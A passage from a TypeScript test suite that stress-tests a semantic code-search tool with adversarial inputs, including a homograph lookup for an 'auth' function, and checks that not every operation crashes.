        callTool("semantic_search", { projectRoot: dir, query: "comp", limit: 3, options: nested } as any),
      ]);

      const crashes = ops.filter(r => r.status === "rejected") as PromiseRejectedResult[];
      const realCrashes = crashes.filter(r => !r.reason?.message?.includes("STUB"));

      if (realCrashes.length === ops.length) {
        throw new Error("ALL adversarial operations crashed — zero input resilience");
      }

      console.log(
        `    Boss fight: ${ops.length - crashes.length}/${ops.length} adversarial ops survived`
      );

      // The homograph search should still find the Latin auth
      if (ops[0].status === "fulfilled") {
        const authResults = (ops[0].value as any)?.results ?? (ops[0].value as any)?.functions ?? [];
        const latinFound = authResults.some(
          (r: any) => r.name === "auth" && r.file?.includes("latin")
        );
        if (!latinFound && authResults.length > 0) {
          console.log("    ⚠️  T60: Latin auth not in top results under adversarial load");
        }
      }
    } finally {
      fs.rmSync(dir, { recursive: true, force: true });
    }
  },
};

export const SUITE_8 = [T51, T52, T53, T54, T55, T56, T57, T58, T59, T60];
